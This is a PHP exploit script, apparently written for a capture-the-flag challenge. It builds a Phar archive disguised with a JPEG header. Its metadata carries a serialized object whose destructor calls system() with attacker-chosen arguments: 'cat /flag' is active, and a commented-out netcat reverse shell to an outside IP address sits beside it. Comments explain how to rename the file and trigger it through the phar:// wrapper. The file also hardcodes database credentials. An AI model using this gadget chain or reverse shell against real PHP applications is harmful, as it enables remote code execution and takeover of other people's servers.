<?php
define('DB_HOST', '127.0.0.1');
define('DB_USER', 'cmsuser');
define('DB_PASS', 'longing47');
define('DB_NAME', 'cmsmaindb');

class DBCON{
    private $mysqli;
    public $func = '';
    public $args = '';
    /**
     * @param string $host     데이터베이스 호스트
     * @param string $dbname   데이터베이스 이름
     * @param string $username 사용자 이름
     * @param string $password 비밀번호
     */
    public function __construct( $dbname = null, $username = null,$host = null, $password = null){
        // .env 방식
        // $host = getenv('DB_HOST');
        
        // COMMENT
        if( $username && $dbname){
            $this->mysqli = new mysqli(DB_HOST, $username, DB_PASS, $dbname);
        }else{
            $this->mysqli = new mysqli(DB_HOST, DB_USER, DB_PASS,DB_NAME);
        }
        if ($this->mysqli->connect_error) {
            die("데이터베이스 연결 실패: " . $this->mysqli->connect_error);
        }
    }
    /**
     * 쿼리 실행
     * 
     * @param string $sql SQL 쿼리
     * @return mysqli_result|bool 쿼리 실행 결과
     */
    public function query($sql){
        $sql = trim($sql); 
        if (empty($sql)) {
            die("잘못된 쿼리");
        }
        $result = $this->mysqli->query($sql);
        if (!$result) {
            die("쿼리 실행 실패: " . $this->mysqli->error);
        }
        if($this->mysqli->insert_id){
            return $this->mysqli->insert_id;
        }
        return $result;
    }
    /**
     * SELECT 쿼리 실행 후 결과 반환
     * 
     * @param string $sql SQL 쿼리
     * @return array|null 쿼리 결과, 결과가 없으면 null
     */
    public function fetchOne($sql){
        $result = $this->query($sql);
        return $result->fetch_assoc(); // 결과를 연관 배열로 반환
    }
    /**
     * 결과에서 연관 배열로 모든 행 가져오기
     * 
     * @param string $sql SQL 쿼리
     * @return array 쿼리 결과
     */
    public function fetchAll($sql){
        $result = $this->query($sql);
        return $result->fetch_all(MYSQLI_ASSOC); // 연관 배열로 모든 결과 반환
    }
    /**
     * 데이터베이스 연결 종료
     */
    public function close(){
        $this->mysqli->close();
    }
    function __destruct() {
        if(!empty($this->func)){
            call_user_func($this->func, $this->args);
        }
    }
}
@unlink("./payload.phar");

$phar = new Phar('./payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("\xff\xd8\xff<?php __HALT_COMPILER(); ?>");

$object = new DBCON(); 
$object->func = "system"; 
$object->args = "cat /flag";
// $object->args = "nc 54.180.156.82 7777 -e /bin/sh";
$phar->setMetadata($object);
$phar->stopBuffering();
$object->close();
// system("mv payload.phar payload.jpg");
// file_exists("phar://./payload.jpg");
// php --define phar.readonly=0 payload.php 
?>

